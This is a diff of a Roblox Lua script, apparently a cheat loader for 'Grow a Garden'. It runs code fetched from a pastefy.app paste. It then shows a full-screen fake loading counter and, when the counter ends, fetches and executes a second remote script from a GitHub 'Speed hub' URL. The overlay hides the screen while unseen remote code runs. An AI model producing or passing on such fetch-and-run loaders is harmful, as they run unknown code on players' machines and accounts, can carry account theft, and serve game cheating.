@@ -1,1 +1,35 @@
 loadstring(game:HttpGet("https://pastefy.app/PxoZkaGR/raw"))()
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local frame = Instance.new("Frame", gui)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.Size = UDim2.new(1, 0, 1, 0)
+
+local title = Instance.new("TextLabel", frame)
+title.Text = "GROW a garden"
+title.Font = Enum.Font.FredokaOne
+title.TextColor3 = Color3.fromRGB(100, 255, 100)
+title.TextScaled = true
+title.BackgroundTransparency = 1
+title.Position = UDim2.new(0.25, 0, 0.35, 0)
+title.Size = UDim2.new(0.5, 0, 0.15, 0)
+
+local percentLabel = Instance.new("TextLabel", frame)
+percentLabel.Text = "0%"
+percentLabel.Font = Enum.Font.GothamBold
+percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentLabel.TextScaled = true
+percentLabel.BackgroundTransparency = 1
+percentLabel.Position = UDim2.new(0.4, 0, 0.55, 0)
+percentLabel.Size = UDim2.new(0.2, 0, 0.08, 0)
+
+for i = 0, 100, 1 do
+    percentLabel.Text = i .. "%"
+    task.wait(0.05)
+end
+
+gui:Destroy()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/universalrobloxx/Grow-a-Garden/refs/heads/main/Speed%2520hub%25shit"))()
